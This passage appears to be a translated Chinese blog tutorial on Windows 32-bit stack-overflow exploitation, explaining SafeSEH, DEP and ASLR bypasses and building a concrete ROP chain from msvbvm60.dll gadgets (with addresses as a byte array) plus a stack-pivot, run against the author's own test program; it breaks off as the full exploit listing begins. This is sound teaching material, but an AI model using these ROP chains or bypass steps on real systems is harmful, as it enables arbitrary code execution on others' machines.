<p>我们得到的不是EXE中FakeHandler函数上的断点，而是得到一个STATUS_INVALID_EXCEPTION_HANDLER异常(代码0xC00001A5)。这是一个源于SafeSEH的安全缓解异常。SafeSEH是一个安全缓解措施，仅适用于32位PE文件。在64位PE文件中，一个名为IMAGE_DIRECTORY_ENTRY_EXCEPTION的永久性（非可选）数据目录取代了原来在32位PE文件中的IMAGE_DIRECTORY_ENTRY_RIGHT数据目录。SafeSEH与GS特性都是在Visual Studio 2003版本中发布的，随后在Visual Studio 2005版本中成为了默认设置。</p>
<p>什么是SafeSEH，它是如何工作的？</p>
<ol>
<li>在Visual Studio 2019中，SafeSEH是默认设置的。它通过使用&#x2F;SAFESEH标志进行配置，我们可以在Project -&gt; Properties -&gt; Linker -&gt; Advanced -&gt; Image Has Safe Exception Handlers中进行相应的设置。</li>
<li>SafeSEH编译的PE文件含有一个有效的SEH handler地址列表，位于名为SEHandlerTable的表中，我们可以在其IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG数据目录中指定。</li>
<li>每当触发异常时，在执行EXCEPTION_REGISTRATION_RECORD链表中的每个handler的地址之前，Windows会检查该handler是否位于映像内存的范围内（表明它与加载的模块有关），如果是的话，就会用它的SEHandlerTable检查这个handler地址对有关模块是否有效。</li>
</ol>
<p>在上图中，我们是通过栈溢出的方式来注册handler的，通过这种方式创建的handler是无法被编译器所识别的（因此，也不会添加到SEHandlerTable中）。通常情况下，编译器会将作为__try __except语句的副作用而创建的handler添加到这个表中。在禁用SafeSEH后，再次运行这段代码会导致栈溢出，执行被喷入的handler。</p>
<p>下图所示为栈溢出，导致执行了伪造的SEH handler，该handler被编译为PE EXE映像的主映像。</p>
<p><img src="/.io//Picture15-1707050428583.png" alt="img"></p>
<p>当然，虽然自2005年以来Visual Studio就默认启用了SafeSEH，但是，在现代应用程序中是否仍然存在禁用了SafeSEH的已加载PE代码呢？在自己探索这个问题的时候，我写了一个PE文件扫描工具，以便在系统范围内检测每个文件是否存在（或缺乏）漏洞缓解措施。当我使用这个扫描工具处理我的Windows 10虚拟机上的SysWOW64文件夹（并对非SafeSEH PEs进行过滤）后，结果令人大跌眼镜。</p>
<p><img src="/.io//Picture16-1707050428583.png" alt="img"></p>
<p>看来，微软本身也有相当多的非SafeSEH PE，特别是至今仍在随Windows10一起提供的DLL。扫描我的Program Files文件夹后，得到的结果则更有说服力，大约有7%的PE文件缺乏SafeSEH保护。事实上，尽管我的虚拟机上安装的第三方应用程序很少，但从7-zip、Sublime Text到VMWare Tools，几乎每个应用程序都至少含有一个非SafeSEH模块。即使在进程的地址空间中只有一个这样的模块，也足以绕过其栈Cookie缓解措施，进而使用本文中探讨的技术利用栈溢出漏洞。</p>
<p>值得注意的是，在如下所示两种不同的情况下，SafeSEH可以被认为对PE生效的，它们是我的工具在扫描中使用的标准：</p>
<ol>
<li>在IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG数据目录中存在上述的SEHandlerTable以及SEHandlerCount大于零的情况。</li>
<li>IMAGE_DLLCHARACTERISTICS_NO_SEH标志被设置在IMAGE_OPTIONAL_HEADER.DllCharacteristics的header字段。</li>
</ol>
<p>假设一个没有采用SafeSEH措施的模块被加载到一个易受攻击的应用程序中，对于exploit编写者来说，仍然还面临令一个重要的障碍。回到图10，尽管一个伪造的SEH HANDLER通过栈溢出被成功执行，但是这个handler被编译到了PE EXE映像本身中。所以，为了实现任意代码执行，我们需要执行一个存储在栈上的伪造SEH HANDLER（一个shellcode）。</p>
<h2 id="DEP-amp-ASLR"><a href="#DEP-amp-ASLR" class="headerlink" title="DEP &amp; ASLR"></a>DEP &amp; ASLR</h2><p>由于存在DEP和ASLR防御机制，在栈上将我们的shellcode用作伪异常handler存在多个障碍：</p>
<ol>
<li>由于存在ASLR机制，我们不知道Shellcode在栈上的地址，因此无法将其嵌入到我们的溢出内容中以喷射到栈中。</li>
<li>由于存在DEP机制，在默认情况下，栈本身以及扩展的shellcode是不可执行的。</li>
</ol>
<p>随着2004年Windows XP SP2的问世，DEP首次在Windows世界得到了广泛的采用，并且从那时起，DEP已经成为当今使用的几乎所有现代应用程序和操作系统的普遍特性。它是通过使用硬件层内存页的PTE头部中的一个特殊位（NX，也就是不可执行位）来实现的，默认情况下，该位将在Windows中所有新分配的内存上被设置。这意味着攻击者必须显式创建可执行内存区域，方法是通过诸如KERNEL32.DLL!VirtualAlloc之类的API分配具有可执行权限的新内存，或者通过使用诸如KERNEL32.DLL!VirtualProtect之类的API将现有的非可执行内存修改为可执行的。这样做的一个副作用是，由于栈和堆在默认情况下都是不可执行的，因此，我们无法直接从这些位置执行shellcode，换句话说，我们必须首先为它开辟一个可执行的内存区域。</p>
<p>从exploit编写的角度来看，理解DEP的关键在于，DEP是一种要么全有要么全无的缓解措施：要么应用于进程内的所有内存，要么不应用于进程内的所有内存。如果使用&#x2F;NXCOMPAT标志编译生成进程的主EXE，则整个进程将启用DEP。与诸如SafeSEH或ASLR之类的缓解措施形成鲜明对比的是，并不存在非DEP DLL模块之类的东西。</p>
<p>从exploit编写的角度来看，DEP的解决方案早已被理解为面向返回的编程（ROP）。原则上，现有的可执行内存将与攻击者提供的栈一起以小片段的形式回收，以实现为我们的shellcode划分可执行区域的目标。创建自己的ROP链时，我选择使用KERNEL32.DLL!VirtualProtect API，以便使存放shellcode的栈区域是可执行的。该API的原型如下所示：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">DWORDflNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在ASLR问世之前，如果可以通过溢出来控制栈，就可以将这五个参数作为常量植入栈，然后触发一个EIP重定向，使其指向KERNEL32.DLL中的VirtualProtect函数（其基地址是静态的）。在这里，唯一的障碍是——我们不知道作为第一个参数传递或作为返回地址使用的shellcode的确切地址。后来，攻击者利用NOP sledding技术（在shellcode的前面填充一大段NOP指令，即0x90）解决了这个问题。然后，exploit编写者可以推断出shellcode在栈中的大致区域，并在这个范围内选取一个地址并将其直接植入溢出内容中，从而通过NOP sled将这个猜测转化为精确的代码执行。</p>
<p>随着2006年Windows Vista中ASLR的出现，ROP链的创建变得有些棘手，因为现在：</p>
<ol>
<li>DLL的基址和VirtualProtect的基址变得不可预测。</li>
<li>shellcode的地址难以猜测。</li>
<li>包含可执行代码片段的模块的地址变得不可预测。</li>
</ol>
<p>这不仅对ROP链提出了更多的要求，同时，还要求其实现要更加精确，因此，NOP sled（1996年左右的经典形式）成为ASLR时代的牺牲品。这也导致了ASLR绕过技术成为了DEP绕过技术的前提条件。如果不绕过ASLR，从而至少定位含有漏洞的进程中一个模块的基地址，就无法知道ROP Gadget的地址，从而无法执行ROP链，也就无法调用VirtualProtect函数来绕过DEP。</p>
<p>要创建一个现代的ROP链，我们首先需要这样一个模块：我们可以在运行时预测其基地址的模块。在大多数现代漏洞利用技术中，这是通过使用内存泄漏漏洞来实现的（这个主题将在本系列的字符串格式错误和堆损坏续集中加以探讨）。为了简单起见，我选择在易受攻击进程的地址空间中引入一个非ASLR模块（来自我的Windows 10虚拟机的SysWOW64目录）。在继续之前，必须了解非ASLR模块背后的概念（以及在exploit编写过程中的作用）。</p>
<p>从exploit编写的角度来看，以下是我认为最有价值的ASLR概念：</p>
<ol>
<li>在Visual Studio 2019中，ASLR是默认设置的。它使用&#x2F;DYNAMICBASE标志进行配置，我们可以在项目设置的Project -&gt; Properties -&gt; Linker -&gt; Advanced -&gt; Randomized Base Address字段中进行配置。</li>
<li>当使用该标志编译PE文件时，它（在默认情况下）总是导致创建一个IMAGE_DIRECTORY_ENTRY_BASERELOC数据目录（存储在PE文件的.reloc段中）。如果没有这些重定位信息，Windows就无法重建模块的基地址并执行ASLR。</li>
<li>编译后的PE将在其IMAGE_OPTIONAL_HEADER.DllCharacteristics头部中设置IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE标志。</li>
<li>当PE被加载时，将为其选择一个随机的基地址，并且其代码&#x2F;数据中的所有绝对地址都将使用重定位部分进行重定位。这个随机地址在每次启动时都是不同的。</li>
<li>如果用于启动进程的主PE(EXE)启用了ASLR，也会导致栈和堆被随机化。</li>
</ol>
<p>您可能会注意到，这实际上会导致两种不同的情况，其中可能会出现非ASLR模块。第一种情况是显式编译模块以排除ASLR标志(或在该标志存在之前编译)，第二种情况是设置了ASLR标志，但由于缺少重新定位而无法应用。</p>
<p>开发人员的一个常见错误是，在他们的编译器中联合使用ASLR标志和“strip relocations”选项，他们认为这样生成的二进制文件是受ASLR保护的，而实际上它仍然是易受攻击的。从历史上看，非ASLR模块非常常见，甚至在Windows7+ Web浏览器攻击中被滥用，并在商业恶意软件中大获成功。现在，这类模块已经逐渐变得稀缺，这在很大程度上是因为ASLR已经成为诸如Visual Studio之类的IDE中默认启用的一种安全缓解措施。令人惊讶的是，我的扫描软件在我的Windows10虚拟机上发现了大量非ASLR模块，许多位于在System32和SysWOW64目录中。</p>
<p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture19.png" alt="img"></p>
<p>值得注意的是，图12中显示的所有非ASLR模块都具有非常不同（且唯一）的基地址。这些都是Microsoft编译的PE文件，其本意就是不使用ASLR，之所以这么做，很可能是出于性能或兼容性的原因。它们将始终加载到image_optional_header.imageBase中指定的映像基地址处（上图中突出显示的值）。显然，这些独特的映像基地址是编译器在创建时随机选择的。通常情况下，PE文件都会在其PE头部中包含默认映像基地址值，如0x00400000（用于EXE）和0x1000000（用于DLL）。这种专门创建的非ASLR模块与因失误而创建的非ASLR模块（如下图所示）形成了鲜明的对比。</p>
<p><img src="/.io//Picture20-1707050428583.png" alt="img"></p>
<p>这是在最新版本的HXD Hex Editor中作为重定位剥离(不知情的开发人员的旧优化习惯)副作用而创建的非ASLR模块的一个主要例子。值得注意的是，您可以在上面的图13中看到，与图12中的模块(具有随机基地址)不同，这些模块都具有相同的默认映像基地址0x00400000（已经被编译到它们的PE头部中）。这与其PE头部中存在的IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE标志相结合，表明编译它们的开发人员假设它们将使用随机地址进行加载，而不是在0x00400000处进行加载，并认为它们会受到ASLR机制的保护。然而，在实践中，我们可以肯定它们总是被加载到地址0x00400000处，尽管已经启用了ASLR——因为在没有重新定位数据的情况下，操作系统是无法在初始化期间重新设置它们的基地址的。</p>
<p>通过回收非ASLR模块的可执行段(通常是它们的.text段)中的代码，我们能够构造相应的ROP链来调用KERNEL32.DLL!VirtualProtect API，并为栈上shellcode禁用DEP保护机制。</p>
<p>在图12中可以看出，我选择了SysWOW64中的非ASLR模块msvbvm60.dll作为ROP链，因为它不仅缺少ASLR保护，而且还缺少SafeSEH(考虑到我们必须知道在溢出时写入栈的伪造SEH handler&#x2F;stack pivot gadget的地址，这是一个至关重要的细节)。此外，这里还通过IAT导入了KERNEL32.DLL!VirtualProtect，这一细节极大地简化了ROP链的创建过程。</p>
<h2 id="创建ROP链"><a href="#创建ROP链" class="headerlink" title="创建ROP链"></a>创建ROP链</h2><p>第一步，我使用Ropper从msvbvm60.dll中提取所有可能有用的可执行代码片段（以RET、JMP或CALL指令结束）。实际上，我创建ROP链有三个主要意图：</p>
<ol>
<li>通过从msvbvm60.dll的IAT加载其地址来调用KERNEL32.DLL!VirtualProtect（以绕过KERNEL32.DLL的ASLR）。</li>
<li>动态控制VirtualProtect的第一个参数，使其指向栈上的shellcode（以绕过DEP）。</li>
<li>人为控制VirtualProtect的返回地址，令其返回时，动态地执行栈上的shellcode（现在的权限是+RWX）。</li>
</ol>
<p>在编写ROP链的时候，我先用汇编语言描述所需逻辑的伪代码，然后，设法用ROP Gadget来复现该逻辑。</p>
<p>下为ROP链的伪代码逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget #1 | MOV REG1, &lt;Address of VirtualProtect IAT thunk&gt; ; RET</span><br><span class="line"></span><br><span class="line">Gadget #2 | MOV REG2, &lt;Address of JMP ESP - Gadget #6&gt; ; RET</span><br><span class="line"></span><br><span class="line">Gadget #3 | MOV REG3, &lt;Address of gadget #5&gt; ; RET</span><br><span class="line"></span><br><span class="line">Gadget #4 | PUSH ESP ; PUSH REG3 ; RET</span><br><span class="line"></span><br><span class="line">Gadget #5 | PUSH REG2 ; JMP DWORD [REG1]</span><br><span class="line"></span><br><span class="line">Gadget #6 | JMP ESP</span><br></pre></td></tr></table></figure>

<p>值得注意的是，在上面精心构造的的逻辑中，使用了msvbvm60.dll中一个包含VirtualProtect地址的解除引用的IAT thunk地址，以解决KERNEL32.DLL的ASLR问题。Windows在加载msvbvm60.dll时，会为我们解析VirtualProtect的地址，并且这个地址将始终保存在msvbvm60.dll内的同一位置处。这里，我打算使用JMP指令来调用它，而不是CALL指令。这是因为我需要为调用VirtualProtect创建一个伪造的返回地址，这个返回地址将导致shellcode（现在已经摆脱了DEP）直接执行。这个伪造的返回地址会指向一个JMP ESP gadget。我这么做的理由是：尽管不知道（也无法知道）通过溢出写入栈中的shellcode的具体位置，但该gadget返回后，ESP会指向ROP链的末端，而我可以精心构造溢出内容，使shellcode正好位于这个ROP链后面。</p>
<p>此外，我在第4个gadget中也使用了同样的技术：通过两个push指令让ESP动态生成VirtualProtect的第一个参数。与JMP ESP指令不同（其中ESP会直接指向我的shellcode），这里的ESP会与我的shellcode的地址略有偏差（运行时ESP与ROP链末端的距离）。这并不是一个问题，因为充其量只是在ROP链的末端除了shellcode本身之外，还将禁用DEP。</p>
<p>在构建ROP链的过程中（也就是将上述逻辑付诸实施过程中），我发现gadget #4（我的伪代码gadget中最稀有和最不可替代的一个）没有出现在msvbvm60.dll中。这个挫折是一个很好的例子，说明了为什么在任何公共漏洞利用代码中几乎每个ROP链都在使用PUSHAD指令，而不是类似于我所描述的伪代码逻辑。</p>
<p>简而言之，PUSHAD指令允许exploit编写者动态地将ESP的值（以及栈上的shellcode）与所有其他相关的KERNEL32.DLL!VirtualProtect参数一起放到栈上，而无需使用任何罕见的gadget。他们所有需要做的就是正确填充每个通用寄存器的值，然后执行PUSHAD ; RET gadget来完成攻击。关于这方面的详细介绍，请访问Corelan撰写的“ Exploit writing tutorial part 10 : Chaining DEP with ROP – the Rubik’s[TM] Cube”一文。最终，我们的ROP链需要通过如下方式设置相关的寄存器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">EAX = NOP sled</span><br><span class="line"></span><br><span class="line">ECX = Old protection (writable address)</span><br><span class="line"></span><br><span class="line">EDX = PAGE_EXECUTE_READWRITE</span><br><span class="line"></span><br><span class="line">EBX = Size</span><br><span class="line"></span><br><span class="line">EBP = VirtualProtect return address (JMP ESP)</span><br><span class="line"></span><br><span class="line">ESI = KERNEL32.DLL!VirtualProtect</span><br><span class="line"></span><br><span class="line">EDI = ROPNOP</span><br></pre></td></tr></table></figure>

<p>在实践中，上面的逻辑可以被ROP gadget替换，具体如下面的伪码所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Gadget #1: MOV EAX, &lt;msvbvm60.dll!VirtualProtect&gt;</span><br><span class="line"></span><br><span class="line">Gadget #2: MOV ESI, DWORD [ESI]</span><br><span class="line"></span><br><span class="line">Gadget #3: MOV EAX, 0x90909090</span><br><span class="line"></span><br><span class="line">Gadget #4: MOV ECX, &lt;msvbvm60.dll!.data&gt;</span><br><span class="line"></span><br><span class="line">Gadget #5: MOV EDX, 0x40</span><br><span class="line"></span><br><span class="line">Gadget #6: MOV EBX, 0x2000</span><br><span class="line"></span><br><span class="line">Gadget #7: MOV EBP,</span><br><span class="line"></span><br><span class="line">Gadget #8: MOV EDI,</span><br><span class="line"></span><br><span class="line">Gadget #9: PUSHAD</span><br><span class="line"></span><br><span class="line">Gadget #10: ROPNOP</span><br><span class="line"></span><br><span class="line">Gadget #11: JMP ESP</span><br></pre></td></tr></table></figure>

<p>上面的伪码逻辑最终可以转换为来自msvbvm60.dll的ROP链数据，具体如下所示：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> RopChain[] =</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x1e\x00\x66&quot;</span> <span class="comment">// 0x66001e54 | Gadget #1 | POP ESI ; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xd0\x10\x00\x66&quot;</span> <span class="comment">// 0x660010d0 -&gt; ESI | &lt;msvbvm60.dll!VirtualProtect thunk&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xfc\x50\x05\x66&quot;</span> <span class="comment">// 0x660550fc | Gadget #2 | MOV EAX, DWORD [ESI] ; POP ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xef\xbe\xad\xde&quot;</span> <span class="comment">// Junk</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf8\x9f\x0f\x66&quot;</span> <span class="comment">// 0x660f9ff8 | Gadget #3 | XCHG EAX, ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x1f\x98\x0e\x66&quot;</span> <span class="comment">// 0x660e981f | Gadget #4 | POP EAX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> <span class="comment">// NOP sled -&gt; EAX | JMP ESP will point here</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf0\x1d\x00\x66&quot;</span> <span class="comment">// 0x66001df0 | Gadget #5 | POP EBP; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xea\xcb\x01\x66&quot;</span> <span class="comment">// 0x6601CBEA -&gt; EBP |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x10\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001f10 | Gadget #6 | POP EBX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x20\x00\x00&quot;</span> <span class="comment">// 0x2000 -&gt; EBX | VirtualProtect() | Param #2 | dwSize</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x21\x44\x06\x66&quot;</span> <span class="comment">// 0x66064421 | Gadget #7 | POP EDX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span> <span class="comment">// 0x40 -&gt; EDX | VirtualProtect() | Param #3 | flNewProtect | PAGE_EXECUTE_READWRITE</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf2\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001ff2 | Gadget #8 | POP ECX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\xa0\x10\x66&quot;</span> <span class="comment">// 0x6610A000 -&gt; ECX | VirtualProtect() | Param #4 | lpflOldProtect</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x5b\x57\x00\x66&quot;</span> <span class="comment">// 0x6600575b | Gadget #9 | POP EDI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf9\x28\x0f\x66&quot;</span> <span class="comment">// 0x660F28F9 -&gt; EDI |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x12\x05\x66&quot;</span> <span class="comment">// 0x66051254 | Gadget #10 | PUSHAD; RET</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x660F28F9 | Gadget #11 | ROPNOP | returns into VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x6601CBEA | Gadget #12 | PUSH ESP; RET | return address from VirtualProtect</span></span><br></pre></td></tr></table></figure>

<h2 id="执行任意代码"><a href="#执行任意代码" class="headerlink" title="执行任意代码"></a>执行任意代码</h2><p>构建了ROP链，也搞定了劫持EIP的方法，现在剩下的唯一任务就是构建exploit。为此，我们必须了解当伪造的SEH handler收到程序的控制权时栈的布局情况。理想情况下，我们当然希望ESP直接指向ROP链的顶部，并结合EIP重定向，使其指向链中的第一个gadget。在实践中，这是不可能的。让我们回顾一下栈喷射代码，并在在伪造的handler的开始处设置一个断点，以观察发生溢出和EIP劫持后栈的状态。</p>
<p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture23.png" alt="img"></p>
<p>在右边的突出显示的区域，我们可以看到栈的底部位于0x010FF3C0处。然而，您可能会注意到，栈中的值都不是我们溢出的内容——大家可能还记得，在发生访问冲突之前，我们在不断向栈中喷射伪造的SEH handler的地址。在左边突出显示的区域，我们可以看到，我们的溢出内容起始于0x010FFA0C附近。因此，在异常发生后，NTDLL.DLL让ESP向我们用溢出内容覆盖的栈区域下方偏移了0x64C字节（记住，栈是向下生长的，而不是向上生长的）。有了这些信息，就不难理解发生了什么。当NTDLL.DLL处理异常时，它开始使用异常发生时ESP下方的栈区域，而这个区域是我们鞭长莫及的，因此，也就无法写入我们的ROP链。</p>
<p>因此，这就产生了一个有趣的问题。也就是说，要想执行ROP链，我们需要让伪造的SEH handler设法让ESP（栈顶指针）重新指向由溢出内容覆盖的栈区域。当我们的断点被击中时，检查ESP的值，我们可以在0x010FF3C0处看到一个返回NTDLL.DLL的地址（无用），其后是另一个位于我们所能控制的栈范围（0x010FF4C4）下方的地址（也无用），它位于0x010FF3C4处。然而，0x010FF3C8处的第三个值0x010FF3A74直接落在从0x010FFA0C开始的受控区域的地址范围内，其偏移值为0x64。重新审视异常处理程序的原型，就会发现这第三个值（代表传递给处理程序的第二个参数）对应的是Windows传递给SEH handler的“已建帧”的指针。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXCEPTION_DISPOSITION __cdecl <span class="title">SehHandler</span><span class="params">(EXCEPTION_RECORD* pExceptionRecord, <span class="type">void</span>* pEstablisherFrame, CONTEXT* pContextRecord, <span class="type">void</span>* pDispatcherContext)</span></span></span><br></pre></td></tr></table></figure>

<p>在我们的调试器中，检查栈中0x010FF3A74这个地址处的内容，我们可以更进一步地了解这个参数（也称为NSEH）的指向。</p>
<p><img src="/.io//Picture24-1707050428583.png" alt="img"></p>
<p>果然，我们可以看到，这个地址指向我们的溢出所控制的栈的一个区域（现在该区域已经被喷入的handler地址填满了）。具体来说，它直接指向前面提到的EXCEPTION_REGISTRATION_RECORD结构体的开始位置，而我们早就覆盖了这个结构体并用它来劫持EIP。在理想情况下，我们伪造的SEH handler会将ESP设置为[ESP + 8]，并且我们会将ROP链的开头部分放在被我们的溢出内容覆盖的EXCEPTION_REGISTRATION_RECORD结构体的开始处。对于这种类型的栈pivot，一个理想的gadget是POP REG;POP REG;POP ESP;RET或这种逻辑的一些变体，然而，msvbvm60.dll中并没有这种gadget，我不得不设法设计一个不同的解决方案。如前所述，当NTDLL将EIP重定向到我们伪造的SEH handler时，ESP在栈上的偏移量0x64C已经超出了我们用溢出控制的区域（具体来说，跑到该区域的下方了）。因此，对于栈pivot的这个问题，一个不太优雅的解决方案就是直接给ESP加上一个大于或等于0x64C的值。Ropper提供了一个功能，可以提取潜在的栈pivot gadget：</p>
<p><img src="/.io//Picture25-1707050428583.png" alt="img"></p>
<p>ADD ESP，0x1004 ; RET是一个略显混乱的gadget：它超出溢出开始处0x990个字节，但由于它是唯一一个值大于0x64C的ADD ESP，因此别无选择。这个栈pivot会让ESP从我们的溢出起始处超出0x990或0x98C个字节（当然，对于同一应用程序的不同实例以及Windows的不同版本来说，该值还能会有所变化）。这意味着我们需要在实际ROP链开始之前，用0x98C个垃圾字节和ROPNOP来填充溢出。</p>
<p><img src="/.io//Picture26-1707050428583.png" alt="img"></p>
<p>将这些知识整合到一段代码中：</p>
<p>(为了避免引发本机反应，以下代码需要在虚拟机中运行)</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span 